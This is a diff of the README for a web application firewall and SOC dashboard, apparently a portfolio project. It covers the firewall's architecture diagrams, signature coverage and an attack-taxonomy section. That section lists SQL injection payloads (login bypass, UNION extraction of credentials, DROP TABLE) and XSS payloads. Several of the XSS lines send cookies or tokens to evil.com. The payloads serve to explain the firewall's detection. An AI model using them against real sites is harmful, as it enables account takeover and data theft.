@@ -1,106 +1,121 @@
-
 <div align="center">
+
+<br/>
 
 # 🛡️ OUTLOOP WAF
 
-### *Next-Generation Web Application Firewall & Security Operations Platform*
+<br/>
+
+**Edge-Native Web Application Firewall & Security Operations Platform**
+
+*Perimeter-grade threat detection. Sub-5ms verdict. Zero infrastructure.*
 
 <br/>
 
 [![Python](https://img.shields.io/badge/Python-3.9+-3776ab?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
 [![FastAPI](https://img.shields.io/badge/FastAPI-0.109+-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
 [![Tests](https://img.shields.io/badge/Tests-44%2F44%20Passing-success?style=for-the-badge&logo=pytest&logoColor=white)](https://github.com/obstinix/outloop-waf/tree/main/tests)
-[![Vercel](https://img.shields.io/badge/Deployed_on-Vercel-black?style=for-the-badge&logo=vercel&logoColor=white)](https://outloop-waf.vercel.app)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
-[![Version](https://img.shields.io/badge/Release-v1.0.0-brightgreen?style=for-the-badge&logo=github)](https://github.com/obstinix/outloop-waf/releases)
-[![Last Commit](https://img.shields.io/github/last-commit/obstinix/outloop-waf?style=for-the-badge&logo=github&color=222222)](https://github.com/obstinix/outloop-waf/commits/main)
-[![Signatures](https://img.shields.io/badge/Active_Signatures-57-critical?style=for-the-badge)](https://outloop-waf.vercel.app/#rules)
+[![Vercel](https://img.shields.io/badge/Deployed-Vercel_Edge-black?style=for-the-badge&logo=vercel&logoColor=white)](https://outloop-waf.vercel.app)
 [![OWASP](https://img.shields.io/badge/OWASP-Top_10_Coverage-orange?style=for-the-badge)](https://owasp.org/Top10/)
-[![Zero Trust](https://img.shields.io/badge/Architecture-Zero--Trust-blue?style=for-the-badge)]()
-[![Sub-5ms](https://img.shields.io/badge/Latency-Sub--5ms-green?style=for-the-badge)]()
+[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](https://github.com/obstinix/outloop-waf/blob/main/LICENSE)
 
 <br/>
 
-> **Security is a process, not a product. OUTLOOP makes it both.**
+[![Signatures](https://img.shields.io/badge/Active_Signatures-57-critical?style=flat-square)](https://outloop-waf.vercel.app/#rules)
+[![Zero Trust](https://img.shields.io/badge/Architecture-Zero--Trust-blue?style=flat-square)]()
+[![Latency](https://img.shields.io/badge/Detection_Latency-Sub--5ms-green?style=flat-square)]()
+[![Version](https://img.shields.io/badge/Release-v1.0.0-brightgreen?style=flat-square&logo=github)](https://github.com/obstinix/outloop-waf/releases)
+[![Last Commit](https://img.shields.io/github/last-commit/obstinix/outloop-waf?style=flat-square&logo=github&color=222222)](https://github.com/obstinix/outloop-waf/commits/main)
 
 <br/>
 
-[![Live Demo](https://img.shields.io/badge/🌐%20Live%20Demo-outloop--waf.vercel.app-00d4ff?style=for-the-badge&labelColor=0a0a0a)](https://outloop-waf.vercel.app)
+> **"Every packet is a suspect until proven clean."**
+> 
+> OUTLOOP enforces zero-trust inspection at the perimeter — intercepting, decoding, and adjudicating every inbound request before it reaches your application layer.
+
+<br/>
+
+| | |
+|:---:|:---:|
+| [![Live Demo](https://img.shields.io/badge/🌐_SOC_Dashboard-outloop--waf.vercel.app-00d4ff?style=for-the-badge&labelColor=0a0a0a)](https://outloop-waf.vercel.app) | [![Payload Sandbox](https://img.shields.io/badge/🔬_Payload_Sandbox-Try_Live_Attacks-e94560?style=for-the-badge&labelColor=0a0a0a)](https://outloop-waf.vercel.app/#playground) |
+
+<br/>
 
 </div>
 
 ---
 
-## 🚀 Release Notes — v1.0.0 (New Stable Release)
+## 🗺️ Navigation
 
-> **This is version 1.0.0** — the first stable production release. The previous version (v0.x) was an initial terminal UI mockup prototype.
-
-### What's New in v1.0.0
-
-- **High-Density SOC Theme** — Upgraded layout to a professional dark-mode dashboard inspired by Linear and Cloudflare
-- **Serverless Static Asset Fallbacks** — Configured robust fallback paths at `/static/...` and `/api/static/...` with explicit MIME types to satisfy strict CDN/browser `X-Content-Type-Options: nosniff` headers under Vercel
-- **Python 3.9+ Compatibility** — Resolved local ASGI connection thread crashes by updating threat streams to handle `asyncio.TimeoutError` correctly
-- **Rate Limiter Hardening** — Sliding-window IP rate limiting with configurable burst thresholds
-- **All 44 Tests Passing** — Full backend security test suite verified and green
+| Module | Live URL | Description |
+|--------|----------|-------------|
+| 🖥️ **SOC Dashboard** | [outloop-waf.vercel.app](https://outloop-waf.vercel.app/) | Real-time threat telemetry, packet counters, attack globe |
+| 🔬 **Payload Sandbox** | [/#playground](https://outloop-waf.vercel.app/#playground) | Interactive attack simulator — no curl or Postman required |
+| 📡 **Threat Stream** | [/#threats](https://outloop-waf.vercel.app/#threats) | Live SSE feed of blocked exploits with severity classification |
+| 🔎 **Signature Explorer** | [/#rules](https://outloop-waf.vercel.app/#rules) | Searchable database of all 57 compiled WAF signatures |
+| 🔄 **Request Pipeline** | [/#pipeline](https://outloop-waf.vercel.app/#pipeline) | Interactive lifecycle diagram from ingress to verdict |
+| ⚙️ **Admin Workspace** | [/#admin](https://outloop-waf.vercel.app/#admin) | Authenticated IP ban console, stats viewer, rule management |
+| 💻 **GitHub Repository** | [obstinix/outloop-waf](https://github.com/obstinix/outloop-waf) | Source code, issues, contributions, CI results |
+| 📖 **API Docs (Swagger)** | [/api/docs](https://outloop-waf.vercel.app/api/docs) | OpenAPI interactive documentation |
 
 ---
 
 ## Table of Contents
 
-- [Overview](#overview)
-- [Live Dashboard Links](#live-dashboard-links)
+- [Threat Intelligence Overview](#threat-intelligence-overview)
 - [System Architecture](#system-architecture)
-- [Research Foundation](#research-foundation)
-- [Feature Analysis & Metrics](#feature-analysis--metrics)
-- [Feature Breakdown](#feature-breakdown)
-- [Attack Vectors & Protection Mechanisms](#attack-vectors--protection-mechanisms)
+- [Detection Engine Internals](#detection-engine-internals)
+- [Attack Vectors & Countermeasures](#attack-vectors--countermeasures)
 - [Technology Stack](#technology-stack)
-- [API Documentation](#api-documentation)
-- [External Integrations](#external-integrations)
+- [Feature Breakdown](#feature-breakdown)
+- [API Reference](#api-reference)
 - [Deployment & Infrastructure](#deployment--infrastructure)
 - [Getting Started](#getting-started)
 - [Project Structure](#project-structure)
-- [Contributing & Bug Reports](#contributing--bug-reports)
+- [Contributing](#contributing)
 - [License](#license)
 
 ---
 
-## Overview
+## Threat Intelligence Overview
 
-**OUTLOOP WAF** is an edge-native Web Application Firewall and Security Operations Center (SOC) platform. It acts as a perimeter proxy gateway, intercepting and inspecting every inbound HTTP request before it reaches downstream application logic. Threats are detected, logged, and blocked in under 5ms — with zero latency impact on clean traffic.
+OUTLOOP WAF is an **edge-native perimeter proxy** and **Security Operations Center (SOC) platform**. It interposes between the public internet and your application, evaluating every inbound HTTP request through a multi-layered inspection pipeline before it reaches any route handler.
 
-### Core Value Propositions
+Threats are decoded, pattern-matched, logged, and blocked in **under 5ms** — with zero overhead for clean traffic.
 
-| Pillar | Description |
-|--------|-------------|
-| 🛡️ **Zero-Trust Inspection** | Every request is inspected — no allowlist by default |
-| ⚡ **Sub-5ms Detection** | Multi-pass regex engine with no perceptible latency |
-| 🔬 **Interactive Sandbox** | Live payload testing via browser — no curl required |
-| 📡 **Real-Time SSE Telemetry** | Threat events pushed to dashboard over Server-Sent Events |
-| 🧠 **57 Active Signatures** | SQLi, XSS, SSRF, RCE, LFI, Path Traversal, Command Injection |
-| ☁️ **Serverless-Native** | Vercel edge deployment — zero infrastructure to manage |
-| 🔒 **Admin Command Center** | IP banning, live stats, rule inspection via authenticated API |
-| 📊 **Live SOC Dashboard** | Three.js animated attack globe + real-time severity counters |
+### Core Defense Properties
 
----
+| Property | Specification |
+|----------|---------------|
+| 🛡️ **Inspection Model** | Zero-trust — every request inspected regardless of source |
+| ⚡ **Detection Latency** | Sub-5ms via pre-compiled regex engine |
+| 🔬 **Sandbox Testing** | Live browser-based payload evaluation |
+| 📡 **Telemetry Protocol** | Server-Sent Events (SSE) — no polling, no WebSocket overhead |
+| 🧠 **Signature Coverage** | 57 active patterns across 7 attack categories |
+| ☁️ **Deployment Model** | Serverless-native — Vercel edge, 100+ PoPs globally |
+| 🔒 **Admin Surface** | Key-authenticated admin API with IP ban enforcement |
+| 📊 **Observability** | Prometheus `/api/metrics` endpoint + live SOC counters |
 
-## Live Dashboard Links
+### Signature Distribution
 
-| Section | Live URL | Purpose |
-|---------|----------|---------|
-| 🖥️ **SOC Overview** | [outloop-waf.vercel.app](https://outloop-waf.vercel.app/) | Real-time packet & threat counters |
-| 🔬 **Payload Sandbox** | [/#playground](https://outloop-waf.vercel.app/#playground) | Interactive attack payload simulator |
-| 📡 **Threat Stream** | [/#threats](https://outloop-waf.vercel.app/#threats) | Live SSE threat telemetry feed |
-| 🔎 **Signature Explorer** | [/#rules](https://outloop-waf.vercel.app/#rules) | Browsable WAF rule database (57 signatures) |
-| 🔄 **Pipeline Diagram** | [/#pipeline](https://outloop-waf.vercel.app/#pipeline) | Request lifecycle visualization |
-| ⚙️ **Admin Workspace** | [/#admin](https://outloop-waf.vercel.app/#admin) | IP ban control & stats console |
-| 💻 **GitHub Repository** | [obstinix/outloop-waf](https://github.com/obstinix/outloop-waf) | Source code, issues, contributions |
+| Category | Signatures | Severity Profile | CWE Mapping |
+|----------|-----------|-----------------|-------------|
+| SQL Injection | 13 | CRITICAL / HIGH | CWE-89 |
+| Cross-Site Scripting | 13 | HIGH / MEDIUM | CWE-79 |
+| Path Traversal | 9 | HIGH / MEDIUM | CWE-22 |
+| Command Injection | 8 | CRITICAL | CWE-77 |
+| SSRF / Metadata Probe | 7 | HIGH | CWE-918 |
+| Local File Inclusion | 5 | HIGH | CWE-98 |
+| Header Attacks (CRLF) | 2 | MEDIUM | CWE-113 |
+| **Total** | **57** | 14 CRITICAL · 22 HIGH · 15 MEDIUM · 6 LOW | OWASP Top 10 |
 
 ---
 
 ## System Architecture
 
-### 1. High-Level System Overview
+### 1. High-Level Ingress Model
+
+The following diagram illustrates how OUTLOOP sits between the public internet and your application layer, operating as the single inspection chokepoint for all inbound traffic.
 
 ```mermaid
 graph LR
@@ -112,8 +127,8 @@ graph LR
 
     subgraph EDGE["☁️ Vercel Edge Network"]
         direction TB
-        EF[Edge Function<br/>Serverless Runtime]
-        MW[OUTLOOP Middleware<br/>WAF Engine]
+        EF[Edge Function\nServerless Runtime]
+        MW[OUTLOOP Middleware\nWAF Engine]
     end
 
     subgraph BACKEND["⚙️ FastAPI Application"]
@@ -126,8 +141,8 @@ graph LR
     end
 
     subgraph DASHBOARD["🖥️ SOC Dashboard"]
-        UI[Static Frontend<br/>HTML + Three.js]
-        SSE[SSE Client<br/>EventSource]
+        UI[Static Frontend\nHTML + Three.js]
+        SSE[SSE Client\nEventSource]
     end
 
     C -->|HTTP Request| EF
@@ -145,9 +160,13 @@ graph LR
     R1 & R2 & R3 --> UI
 ```
 
+> All external actors — browsers, scanners, bots — pass through the same WAF middleware layer. There is no trusted bypass path.
+
 ---
 
 ### 2. Request Processing Pipeline
+
+Every inbound request traverses these sequential gates. A block at any gate issues a `403 Forbidden` and emits an SSE threat event — the request never reaches application code.
 
 ```mermaid
 flowchart TD
@@ -197,193 +216,35 @@ flowchart TD
     style FORWARD fill:#1b2d1b,stroke:#4caf50
 ```
 
+> The five inspection stages — Inbound HTTP → Rate Limit → Blocklist → Multi-Decoder → Regex Match → Verdict — map directly to the interactive pipeline visualization at [/#pipeline](https://outloop-waf.vercel.app/#pipeline).
+
 ---
 
-### 3. Threat Detection Engine Flow
+### 3. Multi-Layer Security Stack
+
+OUTLOOP implements **defense-in-depth** — each layer independently capable of blocking a threat class.
 
 ```mermaid
 flowchart TD
-    RAW["Raw Payload\n(query param, header, body)"] --> D1
-
-    subgraph MULTI["MULTI-PASS DECODER"]
-        D1[Pass 1: Standard URL Decode\n%3C → <]
-        D2[Pass 2: Double URL Decode\n%253C → <]
-        D3[Pass 3: Base64 Decode\nPHNjcmlwdD4= → script]
-        D4[Pass 4: Hex Decode\n0x3C → <]
-        D1 --> D2 --> D3 --> D4
-    end
-
-    D4 --> NORM[Normalize Whitespace\nCase Fold · Strip Comments]
-
-    NORM --> ROUTES
-
-    subgraph ROUTES["SIGNATURE EVALUATION MATRIX"]
-        direction LR
-        SQL["SQLi Engine\n13 patterns\n' OR 1=1, UNION SELECT,\nDROP TABLE, xp_cmdshell"]
-        XSS["XSS Engine\n13 patterns\n&lt;script&gt;, onerror=,\njavascript:, data:text"]
-        PATH["Path Traversal\n9 patterns\n../../, /etc/passwd,\n%2e%2e%2f"]
-        SSRF["SSRF / Metadata\nAWS metadata IPs\n169.254.x.x probes"]
-        CMD["Command Injection\n; ls, | cat, backticks\n$(...), shell operators"]
-        RCE["RCE / LFI\nShellshock: () {:;},\nrequire(), include()"]
-    end
-
-    ROUTES --> AGG{Any Pattern\nMatched?}
-    AGG -->|YES| OUT1["🚨 BLOCKED\nRule ID + Severity\nReturned in 403 body"]
-    AGG -->|NO| Out2["✅ CLEAN\nAppend verification header"]
-```
-
----
-
-### 4. In-Memory State Model
-
-```mermaid
-erDiagram
-    WAF_ENGINE {
-        list compiled_patterns "Pre-compiled regex objects"
-        dict severity_map "rule_id to CRITICAL or HIGH or MEDIUM or LOW"
-        dict rule_descriptions "rule_id to human label"
-        int total_rules "57 active signatures"
-    }
-
-    REQUEST_CONTEXT {
-        string request_id "UUID v4 per request"
-        string client_ip "Extracted from headers"
-        string method "GET or POST or PUT or DELETE"
-        string path "Decoded URI path"
-        string payload "Combined inspection string"
-        float timestamp "Unix epoch"
-    }
-
-    THREAT_EVENT {
-        string request_id "Links to REQUEST_CONTEXT"
-        string rule_id "e.g. SQLi-007"
-        string severity "CRITICAL or HIGH or MEDIUM or LOW"
-        string description "Human-readable threat label"
-        string source_ip "Client IP"
-        float timestamp "ISO 8601 string"
-    }
-
-    BLOCKLIST {
-        string ip_address "IPv4 or IPv6 PK"
-        string reason "Admin-supplied context"
-        float banned_at "Unix epoch"
-    }
-
-    METRICS_STATE {
-        int total_requests "Lifetime counter"
-        int blocked_requests "Threat counter"
-        int allowed_requests "Clean counter"
-    }
-
-    WAF_ENGINE ||--o{ THREAT_EVENT : "generates"
-    REQUEST_CONTEXT ||--|| THREAT_EVENT : "produces"
-    BLOCKLIST }|--|| WAF_ENGINE : "consulted by"
-    METRICS_STATE ||--|| WAF_ENGINE : "updated by"
-```
-
----
-
-### 5. API Gateway Structure
-
-```mermaid
-graph LR
-    subgraph VCL["Vercel Serverless Functions"]
-        direction TB
-        ENTRY[api/index.py\nFastAPI App]
-
-        subgraph ROUTES_GRP["Route Modules"]
-            HR[routes/health.py\n/api/health\n/api/ready\n/api/metrics]
-            SR[routes/secure.py\n/api/secure/test\n/api/secure/echo]
-            GR[routes/gravity.py\n/api/status]
-            ER[SSE Endpoint\n/api/events/threats]
-            AR[Admin Routes\n/api/admin/stats\n/api/admin/ban\n/api/admin/rules]
-        end
-
-        subgraph WAF_MOD["WAF Module"]
-            MID[waf/middleware.py\nFastAPI Middleware]
-            RUL[waf/rules.py\n57 Pattern Definitions]
-            ENG[waf/engine.py\nThreat Analysis Core]
-        end
-
-        UTILS[utils/logger.py\nStructured Logging]
-    end
-
-    CLIENT -->|HTTP| ENTRY
-    ENTRY --> MID
-    MID --> ENG
-    ENG -.->|patterns| RUL
-    MID --> HR & SR & GR & ER & AR
-    HR & SR & GR & AR -.->|log| UTILS
-    ER -->|EventStream| CLIENT
-```
-
----
-
-### 6. Frontend–Backend Interaction Model
-
-```mermaid
-sequenceDiagram
-    participant B as Browser (SOC Dashboard)
-    participant S as Static Assets (Vercel CDN)
-    participant A as FastAPI (Serverless)
-    participant W as WAF Middleware
-    participant E as SSE Event Stream
-
-    B->>S: GET / (index.html + Three.js + JS)
-    S-->>B: 200 OK (HTML/CSS/JS bundle)
-
-    B->>A: GET /api/health
-    W->>W: Inspect headers & path
-    A-->>B: 200 { status: "healthy", rules: 57 }
-
-    B->>A: GET /api/metrics
-    A-->>B: 200 { total_requests, blocked, allowed }
-
-    Note over B,E: User opens Threat Stream tab
-
-    B->>E: GET /api/events/threats (EventSource)
-    E-->>B: data: { "type": "connection" }
-
-    Note over B,A: User submits payload in Sandbox
-
-    B->>A: GET /api/secure/test?payload=<script>alert(1)
-    W->>W: Multi-pass decode
-    W->>W: Regex: XSS pattern matched
-    A-->>B: 403 { blocked: true, rule: "XSS-003", severity: "HIGH" }
-    A->>E: Push threat event to SSE stream
-    E-->>B: data: { rule_id, severity, source_ip, timestamp }
-
-    Note over B,A: Admin authenticates
-
-    B->>A: POST /api/admin/ban { ip: "1.2.3.4" }
-    A-->>B: 200 { banned: true }
-```
-
----
-
-### 7. Security Layer Integration
-
-```mermaid
-flowchart TD
-    subgraph LAYER1["Layer 1: Network Perimeter"]
+    subgraph LAYER1["Layer 1 — Network Perimeter"]
         VCL[Vercel Edge Network\nDDoS absorption · TLS termination]
     end
 
-    subgraph LAYER2["Layer 2: Rate Limiting"]
-        RL[rate_limit_evaluator\nSliding-window per IP\n20 req/burst default]
+    subgraph LAYER2["Layer 2 — Rate Limiting"]
+        RL[Sliding-Window Rate Limiter\n20 req/burst · per-IP enforcement]
     end
 
-    subgraph LAYER3["Layer 3: IP Reputation"]
-        BL[blocklist_perimeter_check\nAdmin-managed deny list\nPersistent in-memory store]
+    subgraph LAYER3["Layer 3 — IP Reputation"]
+        BL[Blocklist Perimeter Check\nAdmin-managed deny list · in-memory store]
     end
 
-    subgraph LAYER4["Layer 4: Payload Inspection"]
+    subgraph LAYER4["Layer 4 — Payload Inspection"]
         DEC[Multi-Pass URL Decoder\n4 normalization passes]
         REG[Regex Signature Engine\n57 compiled patterns]
     end
 
-    subgraph LAYER5["Layer 5: Application Logic"]
-        APP[FastAPI Route Handlers\nBusiness Logic\nAuthenticated via X-Admin-Key]
+    subgraph LAYER5["Layer 5 — Application Logic"]
+        APP[FastAPI Route Handlers\nAuthenticated via X-Admin-Key]
     end
 
     LAYER1 -->|Clean traffic| LAYER2
@@ -402,9 +263,724 @@ flowchart TD
     style LAYER5 fill:#0d1117,stroke:#3fb950
 ```
 
+> Each layer uses a different blocking mechanism: DDoS absorption at the CDN edge, rate enforcement by sliding window, IP reputation by admin-curated blocklist, and deep payload analysis by the regex engine.
+
 ---
 
-### 8. Vercel Deployment Infrastructure
+### 4. API Gateway Structure
+
+The route module architecture separating public endpoints, WAF-gated secure routes, and authenticated admin surfaces.
+
+```mermaid
+graph LR
+    subgraph VCL["Vercel Serverless Functions"]
+        direction TB
+        ENTRY[api/index.py\nFastAPI App Entry]
+
+        subgraph ROUTES_GRP["Route Modules"]
+            HR[routes/health.py\n/api/health · /api/ready · /api/metrics]
+            SR[routes/secure.py\n/api/secure/test · /api/secure/echo]
+            GR[routes/gravity.py\n/api/status]
+            ER[SSE Endpoint\n/api/events/threats]
+            AR[Admin Routes\n/api/admin/stats · /api/admin/ban · /api/admin/rules]
+        end
+
+        subgraph WAF_MOD["WAF Module"]
+            MID[waf/middleware.py\nFastAPI Middleware Interceptor]
+            RUL[waf/rules.py\n57 Compiled Pattern Definitions]
+            ENG[waf/engine.py\nThreat Analysis Core]
+        end
+
+        UTILS[utils/logger.py\nStructured JSON Logging]
+    end
+
+    CLIENT -->|HTTP| ENTRY
+    ENTRY --> MID
+    MID --> ENG
+    ENG -.->|patterns| RUL
+    MID --> HR & SR & GR & ER & AR
+    HR & SR & GR & AR -.->|log| UTILS
+    ER -->|EventStream| CLIENT
+```
+
+> `waf/middleware.py` intercepts the ASGI request scope before any route handler executes. The engine runs synchronously in the middleware hot path — ruling on every request in a single pass.
+
+---
+
+### 5. SSE Real-Time Threat Feed
+
+How blocked attack events propagate from the WAF middleware to the live dashboard without polling.
+
+```mermaid
+sequenceDiagram
+    participant MW as WAF Middleware
+    participant Q as In-Memory Event Queue
+    participant SSE as SSE Generator (/api/events/threats)
+    participant D as SOC Dashboard (EventSource)
+
+    Note over D,SSE: Persistent connection opened on dashboard load
+
+    D->>SSE: GET /api/events/threats
+    SSE-->>D: HTTP 200 · Content-Type: text/event-stream
+
+    Note over MW,Q: Attack intercepted at WAF layer
+
+    MW->>Q: enqueue { rule_id: SQLi-007, severity: CRITICAL, source_ip, timestamp }
+    Q-->>SSE: Dequeue event
+    SSE-->>D: data: { rule_id, severity, source_ip, description, timestamp }
+    D->>D: Append row to threat table
+    D->>D: Increment CRITICAL counter
+    D->>D: Flash status bar
+
+    Note over MW,Q: Second attack — different vector
+
+    MW->>Q: enqueue { rule_id: XSS-003, severity: HIGH }
+    Q-->>SSE: Dequeue
+    SSE-->>D: data: { rule_id: XSS-003, severity: HIGH }
+```
+
+> The SSE stream uses `text/event-stream` content type with automatic client reconnection. No WebSocket handshake, no polling loop — the server pushes events as they occur.
+
+---
+
+### 6. Authentication & Admin Authorization
+
+All admin operations require a valid `X-Admin-Key` header. The WAF middleware inspects the header before the admin route handler is reached.
+
+```mermaid
+flowchart TD
+    ADMIN([Admin User]) --> INPUT[Enter X-Admin-Key\nin Dashboard Workspace]
+    INPUT --> REQ_A[Request to /api/admin/*\nHeader: X-Admin-Key]
+    REQ_A --> MW_A{WAF Middleware\nInspect Payload First}
+    MW_A -->|Payload clean| AUTH{Validate\nX-Admin-Key}
+    AUTH -->|Invalid or Missing| E401[401 Unauthorized]
+    AUTH -->|Valid| PRIV{Requested Operation}
+    PRIV -->|Read Stats| STATS[Return engine metrics]
+    PRIV -->|Ban IP| BAN[Add IP to in-memory blocklist]
+    PRIV -->|List Rules| RULES[Return 57 signatures + patterns]
+    STATS & BAN & RULES --> RESP_A([200 OK + JSON payload])
+    E401 --> END([Client receives error])
+
+    style AUTH fill:#1a1a2e,stroke:#e94560
+    style E401 fill:#2d1b1b,stroke:#e94560
+```
+
+> The admin key is validated server-side on every request. There is no session token — stateless key authentication per call.
+
+---
+
+### 7. Frontend–Backend Communication Model
+
+Full sequence of browser interactions from page load through payload testing to SSE subscription.
+
+```mermaid
+sequenceDiagram
+    participant B as Browser (SOC Dashboard)
+    participant S as Static Assets (Vercel CDN)
+    participant A as FastAPI (Serverless)
+    participant W as WAF Middleware
+    participant E as SSE Event Stream
+
+    B->>S: GET / (index.html + Three.js + JS)
+    S-->>B: 200 OK (HTML/CSS/JS bundle)
+
+    B->>A: GET /api/health
+    W->>W: Inspect headers and path
+    A-->>B: 200 { status: "healthy", rules: 57 }
+
+    B->>A: GET /api/metrics
+    A-->>B: 200 { total_requests, blocked, allowed }
+
+    Note over B,E: User opens Threat Stream tab
+
+    B->>E: GET /api/events/threats (EventSource)
+    E-->>B: data: { "type": "connection" }
+
+    Note over B,A: User submits malicious payload in Sandbox
+
+    B->>A: GET /api/secure/test?payload=<script>alert(1)</script>
+    W->>W: Multi-pass decode
+    W->>W: XSS pattern matched — XSS-003
+    A-->>B: 403 { blocked: true, rule: "XSS-003", severity: "HIGH" }
+    A->>E: Push threat event to SSE stream
+    E-->>B: data: { rule_id, severity, source_ip, timestamp }
+```
+
+---
+
+### 8. In-Memory State Model
+
+The data structures maintained by the running WAF engine — no external database required for core operation.
+
+```mermaid
+erDiagram
+    WAF_ENGINE {
+        list compiled_patterns "Pre-compiled regex objects at startup"
+        dict severity_map "rule_id mapped to CRITICAL or HIGH or MEDIUM or LOW"
+        dict rule_descriptions "rule_id mapped to human-readable label"
+        int total_rules "57 active signatures"
+    }
+
+    REQUEST_CONTEXT {
+        string request_id "UUID v4 per request"
+        string client_ip "Extracted from X-Forwarded-For or remote_addr"
+        string method "GET or POST or PUT or DELETE"
+        string path "Decoded URI path"
+        string payload "Combined inspection string from all surfaces"
+        float timestamp "Unix epoch at receipt"
+    }
+
+    THREAT_EVENT {
+        string request_id "FK to REQUEST_CONTEXT"
+        string rule_id "e.g. SQLi-007"
+        string severity "CRITICAL or HIGH or MEDIUM or LOW"
+        string description "Human-readable threat label"
+        string source_ip "Originating client IP"
+        string timestamp "ISO 8601 format"
+    }
+
+    BLOCKLIST {
+        string ip_address "IPv4 or IPv6 primary key"
+        string reason "Admin-supplied justification"
+        float banned_at "Unix epoch of ban creation"
+    }
+
+    METRICS_STATE {
+        int total_requests "Lifetime request counter"
+        int blocked_requests "Cumulative threat count"
+        int allowed_requests "Cumulative clean count"
+    }
+
+    WAF_ENGINE ||--o{ THREAT_EVENT : "generates"
+    REQUEST_CONTEXT ||--|| THREAT_EVENT : "produces"
+    BLOCKLIST }|--|| WAF_ENGINE : "consulted by"
+    METRICS_STATE ||--|| WAF_ENGINE : "updated by"
+```
+
+---
+
+## Detection Engine Internals
+
+### Multi-Pass Payload Decoder
+
+Before any regex evaluation, OUTLOOP normalizes all input through a 4-pass decoding chain. This eliminates the most common WAF evasion technique: encoding payloads to bypass string matching.
+
+```mermaid
+flowchart TD
+    RAW["Raw Payload\n(query param · header · body)"] --> D1
+
+    subgraph MULTI["MULTI-PASS DECODER"]
+        D1[Pass 1 — Standard URL Decode\n%3C → <]
+        D2[Pass 2 — Double URL Decode\n%253C → <]
+        D3[Pass 3 — Base64 Decode\nPHNjcmlwdD4= → script tag]
+        D4[Pass 4 — Hex Decode\n0x3C → <]
+        D1 --> D2 --> D3 --> D4
+    end
+
+    D4 --> NORM[Normalize Whitespace\nCase Fold · Strip SQL Comments]
+
+    NORM --> ROUTES
+
+    subgraph ROUTES["SIGNATURE EVALUATION MATRIX"]
+        direction LR
+        SQL["SQLi Engine\n13 patterns\nUNION SELECT, DROP TABLE,\nxp_cmdshell, WAITFOR"]
+        XSS["XSS Engine\n13 patterns\nscript tags, onerror=,\njavascript:, data:text"]
+        PATH["Path Traversal\n9 patterns\n../../, /etc/passwd,\n%2e%2e%2f, null byte"]
+        SSRF["SSRF / Metadata\n7 patterns\n169.254.x.x, 10.x.x.x,\nmetadata.google.internal"]
+        CMD["Command Injection\n8 patterns\n; ls, pipe cat, backticks\n$subshell, && chaining"]
+        RCE["RCE / LFI\n5+5 patterns\nShellshock: () {:;},\nrequire(), php://filter"]
+    end
+
+    ROUTES --> AGG{Any Pattern\nMatched?}
+    AGG -->|YES| Out1["🚨 BLOCKED\nRule ID · Severity · 403 body"]
+    AGG -->|NO| Out2["✅ CLEAN\nX-WAF-Status: clean header appended"]
+```
+
+> An attacker submitting `%2527%2520UNION%2520SELECT` (double-encoded SQL) will be caught at Pass 2. A base64-encoded `<script>` tag is caught at Pass 3. The engine sees the canonical payload regardless of encoding layer.
+
+---
+
+## Attack Vectors & Countermeasures
+
+### SQL Injection — CWE-89 · OWASP A03:2021
+
+SQL Injection allows attackers to alter query logic by embedding control characters into database-bound input. It is the most prevalent injection vulnerability class and OUTLOOP's most thoroughly covered category with 13 patterns.
+
+**Mechanics:** When user input is concatenated into a SQL query without parameterization, the database parser treats attacker-supplied tokens as query syntax rather than data literals.
+
+**Attack Taxonomy:**
+
+```sql
+-- ─── 1. Authentication Bypass (Tautology) ────────────────────────────────
+-- Input into username field: admin' --
+-- Resulting server-side query:
+SELECT * FROM users WHERE username='admin' --' AND password='anything'
+-- The double-dash comment operator nullifies the password check entirely.
+
+-- ─── 2. UNION-Based Data Extraction ──────────────────────────────────────
+' UNION SELECT username, password, NULL FROM users --
+' UNION SELECT table_name, column_name, NULL FROM information_schema.columns --
+
+-- ─── 3. Time-Based Blind SQLi (Boolean Inference) ────────────────────────
+'; IF (1=1) WAITFOR DELAY '0:0:5' --   -- MS SQL Server
+' AND SLEEP(5) --                       -- MySQL
+
+-- ─── 4. Stacked Query Execution ──────────────────────────────────────────
+'; DROP TABLE users; --
+'; INSERT INTO admins VALUES ('attacker','pwned'); --
+
+-- ─── 5. Extended Tautology Variants ──────────────────────────────────────
+" OR 1=1 --
+' OR 'a'='a
+' OR 1=1#
+```
+
+**OUTLOOP Countermeasures:** 13 patterns covering `UNION SELECT`, `DROP TABLE`, `xp_cmdshell`, `WAITFOR DELAY`, `SLEEP()`, comment stripping (`--`, `/**/`, `#`), and quote-based tautologies. The multi-pass decoder catches `%27%20OR%20%271%27%3D%271` (URL-encoded) and double-encoded variants before evaluation.
+
+**Live Verification:**
+```bash
+curl -i "https://outloop-waf.vercel.app/api/secure/test?payload=' UNION SELECT username, password FROM users --"
+# HTTP/1.1 403 Forbidden
+# { "blocked": true, "rule_id": "SQLi-007", "severity": "CRITICAL" }
+```
+
+---
+
+### Cross-Site Scripting (XSS) — CWE-79 · OWASP A03:2021
+
+XSS enables injection of client-side scripts into pages rendered by other users' browsers. The victim's browser executes the attacker's code under the trust context of the legitimate domain.
+
+**Attack Taxonomy:**
+
+| Type | Vector | Persistence | Server Visibility |
+|------|--------|-------------|-------------------|
+| **Reflected** | URL parameter echoed in response | None | Yes |
+| **Stored** | Payload persisted to DB, served to all users | Permanent | Yes |
+| **DOM-Based** | Processed entirely by browser JavaScript | None | No |
+
+```html
+<!-- ─── Reflected XSS — Cookie Exfiltration ─────────────────────────────── -->
+<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
+
+<!-- ─── Event Handler Injection — Base64-Encoded Evasion ─────────────────── -->
+<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">
+
+<!-- ─── Protocol-Based Injection ─────────────────────────────────────────── -->
+<a href="javascript:document.location='//evil.com/?'+document.cookie">click</a>
+
+<!-- ─── SVG Vector (bypasses naive script-tag filters) ───────────────────── -->
+<svg onload="fetch('//evil.com?d='+localStorage.getItem('token'))">
+
+<!-- ─── Data URI Injection ───────────────────────────────────────────────── -->
+<iframe src="data:text/html,<script>parent.document.cookie</script>">
+
+<!-- ─── Polyglot XSS (works in HTML and JS contexts simultaneously) ──────── -->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
+```
+
